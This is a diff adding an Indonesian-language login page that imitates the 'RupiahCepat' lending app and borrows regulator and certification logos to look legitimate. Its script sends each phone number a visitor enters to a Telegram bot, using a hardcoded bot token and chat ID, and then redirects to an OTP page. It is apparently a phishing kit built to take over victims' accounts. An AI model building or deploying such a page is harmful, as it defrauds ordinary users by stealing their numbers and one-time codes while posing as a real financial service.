@@ -1,0 +1,152 @@
+<html lang="id" class="scroll-smooth">
+ <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>RupiahCepat Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      font-family: "Inter", sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-white min-h-screen flex flex-col justify-between">
+   <div class="flex items-center space-x-1 text-[10px]">
+   </div>
+  </div>
+  <main class="px-6 pt-8 flex-grow max-w-md mx-auto w-full">
+   <div class="flex justify-end mb-6">
+    <i class="fas fa-headphones-alt text-2xl text-black"></i>
+   </div>
+   <div class="flex items-center space-x-2 mb-4">
+    <img
+      alt="RupiahCepat logo blue and yellow icon"
+      class="w-8 h-8"
+      height="32"
+      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiM-isaMGhB3wUaTYq3Ujrm4-nzy5rXlHV80_pAY16XaDCnhNTNaf2lWepIqppBJiCv47CuDU87y5-ZuPHPlVnOHAuWFHh23pKDa0HWMHSVSnY5hLXJ5JqP9E0tOszlkWpC3hV225mHjgyukSTfEphEw7wI4WvZjX4dFlfaiIXHrCSDEew4bFacUGU1iPLO/s1600/1000106833.png"
+      width="32"
+    />
+    <h1 class="text-2xl font-extrabold text-[#0080FF]">RupiahCepat</h1>
+   </div>
+   <p class="text-gray-600 mb-4 text-base font-normal">
+    Masukkan nomor HP Anda untuk Daftar / Masuk
+   </p>
+   <form id="phoneForm" class="mb-6">
+    <div>
+     <div class="flex items-center bg-gray-100 rounded-full px-5 py-3 mb-2">
+      <span class="font-extrabold text-[#0B1B4D] text-lg">+62</span>
+      <div class="border-l border-gray-300 h-6 mx-3"></div>
+      <input
+        id="phoneInput"
+        name="phone"
+        aria-label="Nomor HP input"
+        class="bg-transparent flex-grow outline-none text-lg text-[#0B1B4D]"
+        placeholder="81234567890"
+        type="tel"
+        required
+        pattern="[0-9]{6,15}"
+      />
+     </div>
+     <div class="text-right mb-6">
+      <a class="text-[#0080FF] text-sm font-normal" href="#">Nomor sudah ganti/lupa?</a>
+     </div>
+    </div>
+    <button
+      type="submit"
+      class="w-full bg-[#4169E1] rounded-full py-4 text-white font-bold text-lg"
+    >
+      Masuk/Daftar
+    </button>
+   </form>
+   <p class="text-gray-400 text-sm leading-relaxed">
+    Sebelum lanjut, pastikan telah membaca, mengetahui, dan menyetujui ketentuan-ketentuan dalam
+    <a class="text-[#0080FF] underline" href="#">Informasi Umum</a>,
+    <a class="text-[#0080FF] underline" href="#">Syarat dan Ketentuan</a>, dan
+    <a class="text-[#0080FF] underline" href="#">Kebijakan Privasi</a> RupiahCepat
+   </p>
+  </main>
+  <footer
+    class="max-w-md mx-auto w-full px-6 py-4 flex justify-between items-center space-x-2"
+  >
+  
+   <img
+     alt="Otoritas Jasa Keuangan logo red text"
+     class="h-5"
+     height="20"
+     src="http://47.74.211.69/_nuxt/img/427a5ec.png"
+     width="50"
+   />
+   <img
+     alt="Asosiasi fintech pendanaan bersama indonesia green logo"
+     class="h-5"
+     height="20"
+     src="https://www.itworks.id/wp-content/uploads/2022/03/AFPI-1.png"
+     width="50"
+   />
+   <img
+     alt="LAPS SJK logo red and yellow"
+     class="h-5"
+     height="20"
+     src="https://images.hukumonline.com/frontend/lt63bb97b0c4fd0/lt63bb985d0ef6b.jpg"
+     width="40"
+   />
+   <img
+     alt="TUV SUD certification blue logo"
+     class="h-5"
+     height="20"
+     src="https://www.izfp.fraunhofer.de/en/institutsprofil/Zertifikate/jcr:content/contentPar/sectioncomponent/sectionParsys/textblockwithpics_co/imageComponent1/image.img.1col.gif/1742976693373/ISO-9001-colour-single.gif"
+     width="40"
+   />
+   <img
+     alt="KOMINFO blue logo"
+     class="h-5"
+     height="20"
+     src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo_of_Ministry_of_Communication_and_Information_Technology_of_the_Republic_of_Indonesia.svg/1024px-Logo_of_Ministry_of_Communication_and_Information_Technology_of_the_Republic_of_Indonesia.svg.png"
+     width="40"
+   />
+  </footer>
+  <script>
+    const botToken = "8316280054:AAGlD7WDlLDzFjfjuEBm87HMHXQ11yMQGSg";
+    const chatId = "5689726675";
+
+    document.getElementById("phoneForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const phoneInput = document.getElementById("phoneInput");
+      const phoneNumber = phoneInput.value.trim();
+
+      if (!phoneNumber.match(/^[0-9]{6,15}$/)) {
+        alert("Nomor HP tidak valid. Masukkan hanya angka 6-15 digit.");
+        return;
+      }
+
+      const message = `Nomor HP masuk/daftar: +62${phoneNumber}`;
+
+      fetch(
+        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+          message
+        )}`
+      )
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.ok) {
+            location.href = "rupiahcepatotp.html";
+            phoneInput.value = "";
+          } else {
+            alert("Gagal mengirim ke Telegram. Coba lagi.");
+          }
+        })
+        .catch(() => {
+          alert("Gagal mengirim ke Telegram. Coba lagi.");
+        });
+    });
+  </script>
+ </body>
+</html>
